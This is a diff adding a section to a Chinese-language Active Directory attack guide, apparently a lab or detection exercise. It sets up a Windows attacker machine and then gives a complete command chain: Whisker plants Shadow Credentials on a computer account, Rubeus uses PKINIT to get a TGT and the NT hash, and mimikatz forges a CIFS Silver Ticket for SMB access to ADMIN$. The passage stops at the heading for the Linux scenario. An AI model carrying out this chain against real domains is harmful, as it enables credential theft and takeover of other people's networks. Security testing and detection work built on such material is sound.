@@ -90,7 +90,69 @@ nmap -p 88,389,445,636 $DC_IP
 
 ---
 
+## 五之二、攻擊機環境（在 Windows）
+
+```powershell
+$env:DOMAIN = "sme.local"
+$env:USER = "Administrator"
+$env:PASS = "YourPassword"
+$env:DC_IP = "10.0.0.206"
+$env:TARGET = "EC2AMAZ-V903HM1"
+
+# 準備工具：Whisker.exe、Rubeus.exe、mimikatz.exe 已可執行
+Get-Command .\Whisker.exe, .\Rubeus.exe, .\mimikatz.exe
+```
+
+取得 Domain SID（供後續 Silver Ticket 使用）：
+
+```powershell
+Import-Module ActiveDirectory
+$DOMAIN_SID = (Get-ADDomain).DomainSID.Value
+```
+
+---
+
 ## 六、攻擊鏈（1 到 6）
+
+### 攻擊場景 A：Windows
+
+1) 列出 KeyCredentials：
+
+```powershell
+.\Whisker.exe list /target:$env:TARGET$ /domain:$env:DOMAIN /dc:$env:DC_IP
+```
+
+2) 植入 Shadow Credentials（會產生 5136）：
+
+```powershell
+.\Whisker.exe add /target:$env:TARGET$ /domain:$env:DOMAIN /dc:$env:DC_IP /path:shadow.pfx /password:ComplexP@ssw0rd123!
+```
+
+3) PKINIT 取 TGT 與嘗試憑證導出：
+
+```powershell
+.\Rubeus.exe asktgt /user:$($env:TARGET)$ /certificate:shadow.pfx /password:ComplexP@ssw0rd123! /getcredentials /nowrap
+```
+
+4) 擷取 NT Hash（若上一步輸出 NT hash，保存以便後續）：
+
+```powershell
+$env:TARGET_HASH = "<NT_HASH_from_Rubeus_output>"
+```
+
+5) 鍛造並注入 Silver Ticket（CIFS，使用 mimikatz）：
+
+```powershell
+.\mimikatz.exe "kerberos::golden /domain:$($env:DOMAIN) /sid:$env:DOMAIN_SID /rc4:$env:TARGET_HASH /user:Administrator /service:cifs /target:$($env:TARGET).$($env:DOMAIN) /ptt" "exit"
+```
+
+6) 使用票進行 SMB 存取：
+
+```powershell
+dir \\$($env:TARGET)\ADMIN$
+```
+
+### 攻擊場景 B：Linux
 
 1) 列出 KeyCredentials（讀取，不會產生 5136）：
 
